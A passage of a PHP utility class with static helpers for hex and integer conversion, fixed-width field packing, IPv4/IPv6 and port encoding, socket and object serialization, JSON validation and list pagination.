        if ( ( strlen ( strval ( $hex ) ) < strlen ( strval ( $min ) ) ) || ( strlen ( strval ( $hex ) ) > strlen ( strval ( $max ) ) ) ) {
            return false;
        }
        if ( ( $_num >= $min ) && ( $_num <= $max ) ) {
            return true;
        }
        return false;
    }

    public static function is_minlen_to_maxlen_hex ( $hex , $min = self::HEX_MIN_LENGTH , $max = self::HEX_MAX_LENGTH )
    {
        if ( ! is_string ( $hex ) ) {
            $hex = strval ( $hex );
        }
        $hex = str_replace ( "\0" , "" , $hex );
        if ( ( strlen ( $hex ) > 2 ) && ( substr ( strtolower ( $hex ) , 0 , 2 ) == "0x" ) ) {
            $hex = substr ( $hex , 2 );
        }
        $_length = strlen ( $hex );
        if ( $_length < self::HEX_MIN_LENGTH ) {
            return false;
        }
        if ( $_length > self::HEX_MAX_LENGTH ) {
            return false;
        }
        if ( ( $_length == self::HEX_MAX_LENGTH ) && ( substr ( $hex , 0 , 1 ) != "0" ) ) {
            return false;
        }
        if ( ( $_length >= $min ) && ( $_length <= $max ) ) {
            if ( self::is_hex ( $hex ) ) {
                return true;
            }
        }
        return false;
    }

    public static function dec_to_hex ( $dec , $hex_string_length = self::SIZE_INTEGER_SPACE )
    {
        if ( ! self::is_minlen_to_maxlen_integer ( $dec , self::INTEGER_MIN_LENGTH , self::INTEGER_MAX_LENGTH ) ) {
            throw new \Exception( 'dec ( ' . $dec . ' )' , 0 );
        }
        if ( ! is_integer ( $dec ) ) {
            $dec = intval ( $dec );
        }
        if ( $dec > self::INTEGER_MAX_VALUE ) {
            throw new \Exception( "dec greater than max value" , 0 );
        }
        $_hex     = dechex ( $dec );
        $_hex_len = strlen ( $_hex );
        if ( $_hex_len < $hex_string_length ) {
            $_hex = str_pad ( $_hex , $hex_string_length , self::CHAR_ZERO , STR_PAD_LEFT );
        }
        return $_hex;
    }

    public static function hex_to_dec ( $hex )
    {
        if ( ! self::is_minlen_to_maxlen_hex ( $hex , self::HEX_MIN_LENGTH , self::HEX_MAX_LENGTH ) ) {
            throw new \Exception( "hex value format is error , hex : " . $hex , 0 );
        }
        $_dec = hexdec ( $hex );
        if ( $_dec > self::INTEGER_MAX_VALUE ) {
            throw new \Exception( "dec greater than max value , dec : " . $_dec , 0 );
        }
        return $_dec;
    }

    public static function string_to_name ( $string , $size )
    {
        if ( ! is_string ( $string ) ) {
            if ( ! is_integer ( $string ) ) {
                throw new \Exception( ( print_r ( $string , true ) . " is data type is neither string nor integer, and its data type is " . gettype ( $string ) ) , 0 );
            }
            $string = strval ( $string );
        }
        $_strlen = strlen ( $string );
        if ( empty( $_strlen ) ) {
            $string = str_repeat ( "\0" , $size );
        } else if ( $_strlen > $size ) {
            $string = substr ( $string , 0 , $size );
        } else {
            $string = str_pad ( $string , $size , self::ASCII_CODE_ZERO , STR_PAD_RIGHT );
        }
        return $string;
    }

    public static function boolean_to_status ( $boolean )
    {
        if ( $boolean === false ) {
            $boolean = 0;
        }
        if ( $boolean === true ) {
            $boolean = 1;
        }
        if ( ( ( $boolean != 0 ) && ( $boolean != 1 ) ) && ( $boolean != '0' ) && ( $boolean != '1' ) ) {
            throw new \Exception( ( "The value of " . print_r ( $boolean , true ) . " is not a valid Boolean type, AAA's type is: " . gettype ( $boolean ) ) , 0 );
        }
        return strval ( $boolean );
    }

    public static function oct_to_mode ( $oct )
    {
        if ( is_string ( $oct ) ) {
            $_oct_length = strlen ( $oct );
            if ( $_oct_length == 3 ) {
                $oct = decoct ( intval ( $oct ) );
            } else if ( $_oct_length != 4 ) {
                throw new \Exception( ( "Error encountered while converting octal number to permission mode! Exception in permission mode format: " . print_r ( $oct , true ) ) , 0 );
            }
            $oct = octdec ( $oct );
        } else if ( ! is_integer ( $oct ) ) {
            throw new \Exception( ( "Error encountered while converting octal number to permission mode! Exception in permission mode format: " . print_r ( $oct , true ) ) , 0 );
        }
        if ( ( $oct < 384 ) || ( $oct > 511 ) ) {
            throw new \Exception( ( "Error encountered while converting octal number to permission mode! Exception in permission mode format: " . print_r ( $oct , true ) ) , 0 );
        }
        $_mode = strval ( $oct );
        $_mode = str_pad ( $_mode , 3 , '0' , STR_PAD_LEFT );
        return $_mode;
    }

    public static function integer_to_type ( $integer )
    {
        $_integer = strval ( $integer );
        if ( ! self::is_minlen_to_maxlen_integer ( $_integer , 4 , 4 ) ) {
            throw new \Exception( ( "Encountered an error converting integer numbers to type! Type format exception: " . print_r ( $integer , true ) ) , 0 );
        }
        return $_integer;
    }

    public static function integer_to_offset ( $integer )
    {
        if ( ! self::is_min_to_max_integer ( $integer , self::OFFSET_BLOCK_MIN , self::OFFSET_BLOCK_MAX ) ) {
            throw new \Exception( ( "Encountered an error converting integer numbers to offset! Type format exception: " . print_r ( $integer , true ) ) , 0 );
        }
        $_integer = self::dec_to_hex ( $integer );
        return $_integer;
    }

    public static function string_to_reserved ( $string , $size )
    {
        if ( ! is_string ( $string ) ) {
            if ( is_null ( $string ) ) {
                $string = "";
            } else if ( is_integer ( $string ) ) {
                $string = strval ( $string );
            } else {
                throw new \Exception( ( "Encountered an error converting string to reserved data! Reserved data format exception: " . print_r ( $string , true ) ) , 0 );
            }
        }
        $_strlen = strlen ( $string );
        if ( $_strlen < $size ) {
            $string = str_repeat ( "\0" , $size );
        } else if ( $_strlen > $size ) {
            $string = substr ( $string , 0 , $size );
        } else {
            $string = str_pad ( $string , $size , self::ASCII_CODE_ZERO , STR_PAD_RIGHT );
        }
        return $string;
    }

    public static function end_flag_to_string ( $string , $size )
    {
        if ( ! self::is_minlen_to_maxlen_string ( $string , $size , $size ) ) {
            throw new \Exception( ( "Encountered an error converting the end flag to a string! End flag format exception: " . print_r ( $string , true ) ) , 0 );
        }
        $_ret = str_replace ( "\0" , "" , strval ( $string ) );
        return $_ret;
    }

    public static function string_to_end_flag ( $string , $size )
    {
        if ( ! self::is_minlen_to_maxlen_string ( $string , $size , $size ) ) {
            throw new \Exception( ( "Encountered an error converting the string to a end flag! string format exception: " . print_r ( $string , true ) ) , 0 );
        }
        $_ret = strval ( $string );
        return $_ret;
    }

    public static function format_name_write ( $name , $size )
    {
        $_name = self::string_to_name ( $name , $size );
        return $_name;
    }

    public static function format_key_write ( $key )
    {
        $_key = self::dec_to_hex ( $key );
        if ( ( ! is_string ( $_key ) ) || ( strlen ( $_key ) != self::SIZE_INTEGER_SPACE ) ) {
            throw new \Exception( "Key type format error , key ( " . print_r ( $key , true ) . " ) , key type ( " . gettype ( $key ) . " ) " , 0 );
        }
        return $_key;
    }

    public static function format_size_write ( $size )
    {
        $_size = self::dec_to_hex ( $size );
        return $_size;
    }

    public static function format_status_write ( $status )
    {
        $_status = self::boolean_to_status ( $status );
        return $_status;
    }

    public static function format_mode_write ( $mode )
    {
        $_mode = self::oct_to_mode ( $mode );
        return $_mode;
    }

    public static function format_type_write ( $type )
    {
        $_type = self::integer_to_type ( $type );
        return $_type;
    }

    public static function format_offset_write ( $offset )
    {
        $_offset = self::integer_to_offset ( $offset );
        return $_offset;
    }

    public static function format_reserved_write ( $reserved , $size )
    {
        $_reserved = self::string_to_reserved ( $reserved , $size );
        return $_reserved;
    }

    public static function format_end_flag_write ( $end_flag , $size )
    {
        $_end_flag = self::string_to_end_flag ( $end_flag , $size );
        return $_end_flag;
    }

    public static function format_content_write ( $content , $size , $format_type = Interface_Base_FormatType::TYPE_FORMAT_STRING )
    {
        if ( $format_type == Interface_Base_FormatType::TYPE_FORMAT_INTEGER ) {
            $_content = self::dec_to_hex ( $content );
        } else if ( $format_type == Interface_Base_FormatType::TYPE_FORMAT_STRING ) {
            $_content = self::string_to_content ( $content , $size );
        } else {
            $_content = self::string_to_content ( $content , $size );
        }
        return $_content;
    }

    public static function format_resource_write ( $resource )
    {
        if ( ! is_resource ( $resource ) ) {
            throw new \Exception( "resource format is error , resource ( " . print_r ( $resource , true ) . " ) " , 0 );
        }
        $_integer = get_resource_id ( $resource );
        if ( ! self::is_min_to_max_integer ( $_integer , self::INTEGER_MIN_VALUE , self::INTEGER_MAX_VALUE ) ) {
            throw new \Exception( "resource_id format write is error , resource_id ( " . print_r ( $_integer , true ) . " ) " , 0 );
        }
        $_hex = self::dec_to_hex ( $_integer );
        return $_hex;
    }

    public static function format_object_write ( $object , $format = self::TYPE_OBJECT_SERIALIZE )
    {
        if ( $format == self::TYPE_OBJECT_SERIALIZE ) {
            $_string = serialize ( $object );
            return $_string;
        } else if ( $format == self::TYPE_OBJECT_JSON ) {
            $_string = json_encode ( $object );
            return $_string;
        } else {
            throw new \Exception( "object format is error , json ( " . print_r ( $object , true ) . " ) " , 0 );
        }
    }

    public static function format_socket_write ( $socket )
    {
        if ( is_resource ( $socket ) ) {
            return self::format_resource_write ( $socket );
        } else if ( is_object ( $socket ) && ( class_exists ( Interface_Base_ResourceType::TYPE_RESOURCE_SOCKET ) ) && ( ( $socket instanceof \Socket ) ) ) {
            $_data        = self::format_object_write ( $socket );
            $_data_length = strlen ( $_data );
            if ( $_data_length > self::HEX_MAX_LENGTH ) {
                throw new \Exception( "After serialization, the string length has exceeded the storage space limit , socket ( " . print_r ( $socket , true ) . " ) , string ( " . $_data . " ) , strlen ( " . $_data_length . " ) " , 0 );
            }
            $_data = self::string_to_data ( $_data , self::HEX_MAX_LENGTH );
            return $_data;
        } else {
            throw new \Exception( "socket format is error , socket ( " . print_r ( $socket , true ) . " ) " , 0 );
        }
    }

    public static function format_name_read ( $name )
    {
        $_name = strval ( $name );
        $_name = str_replace ( "\0" , "" , $_name );
        return $_name;
    }

    public static function format_key_read ( $key )
    {
        if ( ( ! is_string ( $key ) ) || ( strlen ( $key ) != self::SIZE_INTEGER_SPACE ) ) {
            throw new \Exception( "Key type format error , key ( " . print_r ( $key , true ) . " ) , key type ( " . gettype ( $key ) . " ) " , 0 );
        }
        $_key = self::hex_to_dec ( $key );
        return $_key;
    }

    public static function format_size_read ( $size )
    {
        if ( ( ! is_string ( $size ) ) || ( strlen ( $size ) != self::SIZE_INTEGER_SPACE ) ) {
            throw new \Exception( "size type format error , size ( " . print_r ( $size , true ) . " ) , size type ( " . gettype ( $size ) . " ) " , 0 );
        }
        $_size = self::hex_to_dec ( $size );
        return $_size;
    }

    public static function format_status_read ( $status )
    {
        $_status = intval ( $status );
        return $_status;
    }

    public static function format_mode_read ( $mode )
    {
        $_mode = intval ( $mode );
        return $_mode;
    }

    public static function format_type_read ( $type )
    {
        $_type = intval ( $type );
        return $_type;
    }

    public static function format_reserved_read ( $reserved )
    {
        $_reserved = strval ( $reserved );
        $_reserved = str_replace ( "\0" , "" , $_reserved );
        return $_reserved;
    }

    public static function format_offset_read ( $offset )
    {
        if ( ( ! is_string ( $offset ) ) || ( strlen ( $offset ) != self::SIZE_INTEGER_SPACE ) ) {
            throw new \Exception( "offset type format error , offset ( " . print_r ( $offset , true ) . " ) , offset type ( " . gettype ( $offset ) . " ) " , 0 );
        }
        $_offset = self::hex_to_dec ( $offset );
        return $_offset;
    }

    public static function format_end_flag_read ( $end_flag )
    {
        $_end_flag = strval ( $end_flag );
        $_end_flag = str_replace ( "\0" , "" , $_end_flag );
        return $_end_flag;
    }

    public static function format_content_read ( $content , $format_type = Interface_Base_FormatType::TYPE_FORMAT_STRING )
    {
        if ( $format_type == Interface_Base_FormatType::TYPE_FORMAT_INTEGER ) {
            $_content = self::hex_to_dec ( $content );
        } else if ( $format_type == Interface_Base_FormatType::TYPE_FORMAT_STRING ) {
            $_content = self::content_to_string ( $content );
        } else {
            $_content = self::content_to_string ( $content );
        }
        return $_content;
    }

    public static function format_resource_read ( $hex )
    {
        $_integer   = self::hex_to_dec ( $hex );
        $_resources = get_resources ();
        if ( empty( $_resources ) ) {
            throw new \Exception( "resources is empty , resources : " . print_r ( $_resources , true ) , 0 );
        }
        if ( ! is_array ( $_resources ) ) {
            throw new \Exception( "resources is not a array , resources : " . print_r ( $_resources , true ) , 0 );
        }
        if ( ! array_key_exists ( $_integer , $_resources ) ) {
            throw new \Exception( "resources ( " . $_integer . " ) is not a exist , resources : " . print_r ( $_resources , true ) , 0 );
        }
        if ( ! is_resource ( $_resources[ $_integer ] ) ) {
            throw new \Exception( "resource_id ( " . $_integer . " ) is not a resource , resources : " . print_r ( $_resources , true ) , 0 );
        }
        return $_resources[ $_integer ];
    }

    public static function format_object_read ( $encode_data , $format = self::TYPE_OBJECT_SERIALIZE )
    {
        if ( $format == self::TYPE_OBJECT_SERIALIZE ) {
            $encode_data = self::data_to_string ( $encode_data );
            $_object     = unserialize ( $encode_data );
            return $_object;
        } else if ( $format == self::TYPE_OBJECT_JSON ) {
            $encode_data = self::data_to_string ( $encode_data );
            if ( ! self::is_json ( $encode_data ) ) {
                throw new \Exception( "json string format is error , encode_json ( " . print_r ( $encode_data , true ) . " ) " , 0 );
            }
            $_json = json_decode ( $encode_data );
            if ( ( ! is_object ( $_json ) ) ) {
                throw new \Exception( "json object format is error , json ( " . print_r ( $_json , true ) . " ) " , 0 );
            }
            return $_json;
        } else {
            throw new \Exception( "object format is error , json ( " . print_r ( $encode_data , true ) . " ) " , 0 );
        }
    }

    public static function format_socket_read ( $encode_socket )
    {
        if ( self::is_minlen_to_maxlen_hex ( $encode_socket , self::HEX_MAX_LENGTH , self::HEX_MAX_LENGTH ) ) {
            return self::format_resource_read ( $encode_socket );
        } else if ( self::is_json ( $encode_socket ) ) {
            return self::format_object_read ( $encode_socket );
        } else {
            throw new \Exception( "encode socket format is error , encode_socket ( " . $encode_socket . " ) " , 0 );
        }
    }

    public static function path ( $path )
    {
        $_path = str_replace ( "\\" , "/" , $path );
        return $_path;
    }

    public static function check_pack_integer ( $integer )
    {
        if ( ! self::is_minlen_to_maxlen_integer ( $integer , self::INTEGER_MIN_LENGTH , self::INTEGER_MAX_LENGTH ) ) {
            throw new \Exception( "pack integer data is error , data : " . print_r ( $integer , true ) , 0 );
        }
    }

    public static function pack ( $data , $format_type = self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK )
    {
        $_format = self::DATA_FORMAT_STRING_NULL_FILL_PACK;
        if ( $format_type == self::DATA_FORMAT_TYPE_64_INTEGER_PACK ) {
            self::check_pack_integer ( $data );
            $_format = self::DATA_FORMAT_64_INTEGER_PACK;
            $data    = dechex ( $data );
        }
        $_pack_data = pack ( $_format , $data );
        return $_pack_data;
    }

    public static function unpack ( $pack_data , $format_type = self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK )
    {
        $_format = self::DATA_FORMAT_STRING_NULL_FILL_PACK;
        if ( $format_type == self::DATA_FORMAT_TYPE_64_INTEGER_PACK ) {
            $_format = self::DATA_FORMAT_64_INTEGER_PACK;
        }
        $_data = unpack ( $_format , $pack_data );
        if ( is_array ( $_data ) ) {
            $_data = $_data[ 1 ];
        }
        if ( $format_type == self::DATA_FORMAT_TYPE_64_INTEGER_PACK ) {
            $_data = hexdec ( $_data );
            if ( ! self::is_minlen_to_maxlen_integer ( $_data , self::INTEGER_MIN_LENGTH , self::INTEGER_MAX_LENGTH ) ) {
                throw new \Exception( "unpack integer data is error , data : " . print_r ( $_data , true ) , 0 );
            }
        }
        return $_data;
    }

    public static function encode ( $data )
    {
        $data = urlencode ( $data );
        $data = self::pack ( $data , self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        $data = base64_encode ( $data );
        return $data;
    }

    public static function decode ( $data )
    {
        $data = base64_decode ( $data );
        $data = self::unpack ( $data , self::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        $data = urldecode ( $data );
        return $data;
    }

    public static function ip_to_integer ( $ip )
    {
        $_integer = ip2long ( $ip );
        return $_integer;
    }

    public static function integer_to_ip ( $integer )
    {
        $_ip = long2ip ( $integer );
        return $_ip;
    }

    public static function ip_to_hex ( $ip )
    {
        $_integer = self::ip_to_integer ( $ip );
        $_hex     = self::dec_to_hex ( $_integer );
        return $_hex;
    }

    public static function hex_to_ip ( $hex )
    {
        $_integer = self::hex_to_dec ( $hex );
        $_ip      = self::integer_to_ip ( $_integer );
        return $_ip;
    }

    public static function port_to_hex ( $port )
    {
        $_hex = self::dec_to_hex ( $port );
        return $_hex;
    }

    public static function hex_to_port ( $hex )
    {
        $_port = self::hex_to_dec ( $hex );
        return $_port;
    }

    public static function format_ip_read ( $hex )
    {
        $_integer = self::hex_to_dec ( $hex );
        $_ip      = self::integer_to_ip ( $_integer );
        return $_ip;
    }

    public static function format_ip_write ( $ip )
    {
        $_integer = self::ip_to_integer ( $ip );
        $_hex     = self::dec_to_hex ( $_integer );
        return $_hex;
    }

    public static function format_port_read ( $hex )
    {
        $_port = self::hex_to_dec ( $hex );
        return $_port;
    }

    public static function format_port_write ( $port )
    {
        $_hex = self::dec_to_hex ( $port );
        return $_hex;
    }

    public static function is_socket ( $socket )
    {
        if ( ( is_resource ( $socket ) ) && ( get_resource_type ( $socket ) == Interface_Base_ResourceType::TYPE_RESOURCE_SOCKET ) ) {
            return true;
        }
        if ( ( is_object ( $socket ) ) && ( ( class_exists ( Interface_Base_ResourceType::TYPE_RESOURCE_SOCKET ) ) && ( $socket instanceof \Socket ) ) ) {
            return true;
        }
        return false;
    }

    public static function is_json ( $json )
    {
        if ( self::is_empty ( $json ) ) {
            return false;
        }
        $_left_brace             = "{";
        $_right_brace            = "}";
        $_left_bracket           = "[";
        $_right_bracket          = "]";
        $_left_brace_position    = stripos ( $json , $_left_brace );
        $_right_brace_position   = stripos ( $json , $_right_brace );
        $_left_bracket_position  = stripos ( $json , $_left_bracket );
        $_right_bracket_position = stripos ( $json , $_right_bracket );
        if ( ( false === $_left_brace_position ) && ( false === $_right_brace_position ) && ( false === $_left_bracket_position ) && ( false === $_right_bracket_position ) ) {
            return false;
        }
        if ( ( false !== $_left_brace_position ) && ( false === $_right_brace_position ) ) {
            return false;
        }
        if ( ( false !== $_right_brace_position ) && ( false === $_left_brace_position ) ) {
            return false;
        }
        if ( ( false !== $_left_bracket_position ) && ( false === $_right_bracket_position ) ) {
            return false;
        }
        if ( ( false !== $_right_bracket_position ) && ( false === $_left_bracket_position ) ) {
            return false;
        }
        if ( $_left_brace_position > $_right_brace_position ) {
            return false;
        }
        if ( $_left_bracket_position > $_right_bracket_position ) {
            return false;
        }
        try {
            json_decode ( $json , true );
            $_bool = ( JSON_ERROR_NONE === json_last_error () );
            return $_bool;
        } catch ( \Exception $e ) {
            return false;
        }
    }

    public static function format_message_read ( $message )
    {
        if ( is_null ( $message ) ) {
            return "";
        }
        $_message = str_replace ( "\r\n" , "" , $message );
        $_message = str_replace ( "\r" , "" , $_message );
        $_message = str_replace ( "\n" , "" , $_message );
        return $_message;
    }

    public static function format_package_bin_to_hex ( $package )
    {
        if ( ! is_string ( $package ) ) {
            $package = strval ( $package );
        }
        $package = bin2hex ( $package );
        return $package;
    }

    public static function format_ipv6_data_write ( $data , $format = "a*" )
    {
        $_data = pack ( $format , $data );
        return $_data;
    }

    public static function format_ipv6_data_read ( $data , $format = "a*" )
    {
        $_data = unpack ( $format , $data );
        if ( is_array ( $_data ) ) {
            $_data = $_data[ 1 ];
        }
        return $_data;
    }

    public static function ipv6_to_long6 ( $ipv6 )
    {
        if ( ( strlen ( $ipv6 ) > 3 ) && ( substr ( $ipv6 , - 3 , 3 ) == "/64" ) ) {
            $ipv6 = substr ( $ipv6 , 0 , ( strlen ( $ipv6 ) - 3 ) );
        }
        $_ipv6_bin_string = "";
        $_ipv6_bin        = inet_pton ( $ipv6 );
        for ( $_ipv6_bin_index = 15 ; $_ipv6_bin_index >= 0 ; $_ipv6_bin_index -- ) {
            $_ascii           = ord ( $_ipv6_bin[ $_ipv6_bin_index ] );
            $_ascii_bin       = str_pad ( decbin ( $_ascii ) , 8 , '0' , STR_PAD_LEFT );
            $_ipv6_bin_string = ( $_ascii_bin . $_ipv6_bin_string );
        }
        $_long6 = self::bin_string_to_dec ( $_ipv6_bin_string );
        return $_long6;
    }

    public static function long6_to_complete_ipv6 ( $long6 )
    {
        $_ipv6_bin_string = Class_Base_RawSocket::dec_to_bin_string ( $long6 );
        if ( strlen ( $_ipv6_bin_string ) < 128 ) {
            $_ipv6_bin_string = str_pad ( $long6 , 128 , "0" , STR_PAD_LEFT );
        }
        $_ipv6 = "";
        for ( $_ipv6_bin_index = 0 ; $_ipv6_bin_index <= 7 ; $_ipv6_bin_index ++ ) {
            $_16_bit_bin = substr ( $_ipv6_bin_string , ( $_ipv6_bin_index * 16 ) , 16 );
            $_hex        = dechex ( bindec ( $_16_bit_bin ) );
            if ( $_ipv6_bin_index < 7 ) {
                $_ipv6 .= $_hex . ":";
            } else {
                $_ipv6 .= $_hex;
            }
        }
        return $_ipv6;
    }

    public static function long6_to_ipv6 ( $long6 )
    {
        $_ipv6 = self::long6_to_complete_ipv6 ( $long6 );
        $_ipv6 = inet_ntop ( inet_pton ( $_ipv6 ) );
        return $_ipv6;
    }

    public static function dec_to_bin_string ( $integer )
    {
        if ( ( ! is_integer ( $integer ) ) && ( ! is_string ( $integer ) ) ) {
            throw new \Exception( ( "integer is error , integer : " . print_r ( $integer , true ) ) , 0 );
        }
        $_integer = $integer;
        $_tmp     = "";
        if ( is_integer ( $integer ) ) {
            while ( $_integer >= 1 ) {
                $_mod     = ( $_integer % 2 );
                $_tmp     .= $_mod;
                $_integer = $_integer / 2;
            }
        } else if ( is_string ( $integer ) ) {
            if ( ! Class_Base_Format::is_integer ( $integer ) ) {
                throw new \Exception( ( "integer is error , integer : " . print_r ( $integer , true ) ) , 0 );
            }
            while ( ( bccomp ( $_integer , 1 ) == 1 ) || ( bccomp ( $_integer , 1 ) == 0 ) ) {
                $_mod     = bcmod ( $_integer , 2 );
                $_tmp     .= $_mod;
                $_integer = bcdiv ( $_integer , 2 );
            }
        }
        $_tmp_length = strlen ( $_tmp );
        $_bin        = "";
        for ( $i = ( $_tmp_length - 1 ) ; $i >= 0 ; $i -- ) {
            $_bin .= substr ( $_tmp , $i , 1 );
        }
        $_bin_length = strlen ( $_bin );
        if ( $_bin_length < 8 ) {
            $_bin = str_pad ( $_bin , 8 , '0' , STR_PAD_LEFT );
        }
        if ( ( $_bin_length % 8 ) != 0 ) {
            for ( $i = 1 ; $i < 8 ; $i ++ ) {
                $_tmp = ( $_bin_length + $i );
                if ( ( $_tmp % 8 ) == 0 ) {
                    break;
                }
            }
            $_bin = str_pad ( $_bin , $_tmp , '0' , STR_PAD_LEFT );
        }
        return $_bin;
    }

    public static function bin_string_to_dec ( $string )
    {
        $_dec    = 0;
        $_strlen = strlen ( $string );
        $_j      = 0;
        for ( $i = ( $_strlen - 1 ) ; $i >= 0 ; $i -- ) {
            $_char     = substr ( $string , $i , 1 );
            $_char_dec = intval ( $_char );
            if ( $_strlen <= 64 ) {
                $_dec += ( $_char_dec * pow ( 2 , $_j ) );
            } else {
                if ( ! is_string ( $_dec ) ) {
                    $_dec = strval ( $_dec );
                }
                $_dec = bcadd ( $_dec , ( bcmul ( $_char_dec , bcpow ( 2 , $_j ) ) ) );
            }
            $_j ++;
        }
        return $_dec;
    }

    public static function bin_string_to_bin ( $string )
    {
        $_bin    = "";
        $_strlen = strlen ( $string );
        if ( ( $_strlen < 8 ) || ( ( $_strlen % 8 ) != 0 ) ) {
            throw new \Exception( ( "string is error , string : " . print_r ( $string , true ) ) , 0 );
        }
        for ( $i = 0 ; $i < $_strlen ; $i += 8 ) {
            $_str  = substr ( $string , $i , 8 );
            $_dec  = bindec ( $_str );
            $_char = chr ( $_dec );
            $_bin  .= $_char;
        }
        return $_bin;
    }

    public static function bin_to_bin_string ( $bin )
    {
        $_bin_string = "";
        $_bin_length = strlen ( $bin );
        for ( $i = 0 ; $i < $_bin_length ; $i += 1 ) {
            $_char     = substr ( $bin , $i , 1 );
            $_dec      = ord ( $_char );
            $_bin_char = decbin ( $_dec );
            if ( strlen ( $_bin_char ) < 8 ) {
                $_bin_char = str_pad ( $_bin_char , 8 , '0' , STR_PAD_LEFT );
            }
            $_bin_string .= $_bin_char;
        }
        return $_bin_string;
    }

    public static function format_ipv6_address_to_128_bit ( $ipv6 )
    {
        $_integer    = self::ipv6_to_long6 ( $ipv6 );
        $_bin_string = self::dec_to_bin_string ( $_integer );
        $_bin        = self::bin_string_to_bin ( $_bin_string );
        return $_bin;
    }

    public static function format_128_bit_to_ipv6_address ( $bin )
    {
        $_bin_string = self::bin_to_bin_string ( $bin );
        $_dec        = self::bin_string_to_dec ( $_bin_string );
        $_ipv6       = self::long6_to_ipv6 ( $_dec );
        return $_ipv6;
    }

    public static function htmlentities ( $string )
    {
        if ( ! is_string ( $string ) ) {
            $string = strval ( $string );
        }
        $_string = htmlentities ( $string );
        return $_string;
    }

    public static function action ( $action )
    {
        $_action = strval ( $action );
        if ( ! empty( $_action ) ) {
            if ( substr ( $_action , 0 , 1 ) != "/" ) {
                $_action = "/" . $_action;
            }
        }
        $_index_file_name = INDEX_FILE_URI;
        $_action          = $_index_file_name . '?url=' . $_action;
        return $_action;
    }

    public static function string_to_hexs_string ( $string )
    {
        $_hexs_string   = "";
        $_string_length = strlen ( $string );
        for ( $index = 0 ; $index < $_string_length ; $index ++ ) {
            $_hexs_string .= "\\x" . str_pad ( dechex ( ord ( substr ( $string , $index , 1 ) ) ) , 2 , '0' , STR_PAD_LEFT );
        }
        return $_hexs_string;
    }

    public static function hexs_string_to_string ( $hexs_string )
    {
        $_string    = "";
        $_hexs      = explode ( "\\x" , $hexs_string );
        $_hexs_size = count ( $_hexs );
        if ( $_hexs_size <= 1 ) {
            throw new \Exception( "Hexadecimal string format error , hexs : " . print_r ( $_hexs , true ) , 0 );
        }
        for ( $index = 1 ; $index < $_hexs_size ; $index ++ ) {
            if ( ! Class_Base_Format::is_minlen_to_maxlen_hex ( $_hexs[ $index ] , 2 , 2 ) ) {
                throw new \Exception( "Hexadecimal string format error , hex : " . ( $_hexs[ $index ] ) , 0 );
            }
            $_string .= chr ( hexdec ( $_hexs[ $index ] ) );
        }
        return $_string;
    }

    public static function map_to_list ( $map , $cols_size = 10 , $keyword = null )
    {
        if ( ( ! is_integer ( $cols_size ) ) || ( $cols_size < 1 ) ) {
            $cols_size = 1;
        }
        if ( ! is_array ( $map ) ) {
            throw new \Exception( ( "map is not a array , map : " . print_r ( $map , true ) ) , 0 );
        }
        if ( is_null ( $keyword ) ) {
            $keyword = "";
        }
        if ( ( ! is_string ( $keyword ) ) ) {
            $keyword = strval ( $keyword );
        }
        $_rows_index = 0;
        $_cols_index = 0;
        $_list       = array ();
        if ( $keyword != "" ) {
            foreach ( $map as $key => $value ) {
                if ( strpos ( strval ( $key ) , $keyword ) !== false ) {
                    if ( ! is_array ( $_list[ $_rows_index ] ) ) {
                        $_list[ $_rows_index ] = array ();
                    }
                    $_list[ $_rows_index ][ $key ] = $value;
                    $_cols_index ++;
                    if ( ( $_cols_index >= $cols_size ) && ( ( $_cols_index % $cols_size ) == 0 ) ) {
                        $_cols_index = 0;
                        $_rows_index ++;
                    }
                }
            }
        } else {
            foreach ( $map as $key => $value ) {
                if ( ! is_array ( $_list[ $_rows_index ] ) ) {
                    $_list[ $_rows_index ] = array ();
                }
                $_list[ $_rows_index ][ $key ] = $value;
                $_cols_index ++;
                if ( ( $_cols_index >= $cols_size ) && ( ( $_cols_index % $cols_size ) == 0 ) ) {
                    $_cols_index = 0;
                    $_rows_index ++;
                }
            }
        }
        return $_list;
    }

    public static function set_page_params ( $total , &$page , &$page_size , &$max_page )
    {
        if ( ! is_integer ( $page ) ) {
            throw new \Exception( ( "page is not a integer , page : " . print_r ( $page , true ) ) , 0 );
        }
        if ( ! is_integer ( $page_size ) ) {
            throw new \Exception( ( "page_size is not a integer , page_size : " . print_r ( $page_size , true ) ) , 0 );
        }
        if ( ! is_integer ( $max_page ) ) {
            throw new \Exception( ( "max_page is not a integer , max_page : " . print_r ( $page , true ) ) , 0 );
        }
        if ( $page < 1 ) {
            $page = 1;
        }
        if ( $page_size < 1 ) {
            $page_size = 1;
        }
        if ( $page_size > $total ) {
            $page_size = $total;
        }
        if ( $max_page < 1 ) {
            $max_page = 1;
        }
        if ( $total > $page_size ) {
            if ( ( $total % $page_size ) == 0 ) {
                $max_page = ( $total / $page_size );
            } else {
                $max_page = ( ( $total / $page_size ) + 1 );
            }
        }
        if ( $page > $max_page ) {
            $page = $max_page;
        }
        $max_page = ( intval ( $max_page ) );
    }

    public static function list_to_page_list ( $list , &$page , &$page_size , &$max_page )
    {
        if ( ! is_array ( $list ) ) {
            throw new \Exception( ( "list is not a array , list : " . print_r ( $list , true ) ) , 0 );
        }
        if ( ! is_integer ( $page ) ) {
            throw new \Exception( ( "page is not a integer number , page : " . print_r ( $page , true ) ) , 0 );
        }
        if ( ! is_integer ( $page_size ) ) {
            throw new \Exception( ( "page_size is not a integer number , page_size : " . print_r ( $page_size , true ) ) , 0 );
        }
        $_page_list = array ();
        $_list_size = count ( $list );
        if ( $page < 1 ) {
            $page = 1;
        }
        if ( $page_size < 1 ) {
            $page_size = 1;
        }
        if ( $page_size > $_list_size ) {
            $page_size = $_list_size;
        }
        if ( $max_page < 1 ) {
            $max_page = 1;
        }
        if ( $_list_size > $page_size ) {
            if ( ( $_list_size % $page_size ) == 0 ) {
                $max_page = ( $_list_size / $page_size );
            } else {
                $max_page = ( ( $_list_size / $page_size ) + 1 );
            }
        }
        $max_page = ( intval ( $max_page ) );
        if ( $page > $max_page ) {
            $page = $max_page;
        }
        $_row_offset       = ( $page_size * ( $page - 1 ) );
        $_row_offset_limit = ( ( $page_size * ( $page - 1 ) ) + $page_size );
        for ( $list_index = $_row_offset ; $list_index < $_list_size ; $list_index ++ ) {
            if ( $list_index >= $_row_offset_limit ) {
                break;
            }
            $_page_list[] = $list[ $list_index ];
        }
        return $_page_list;
    }

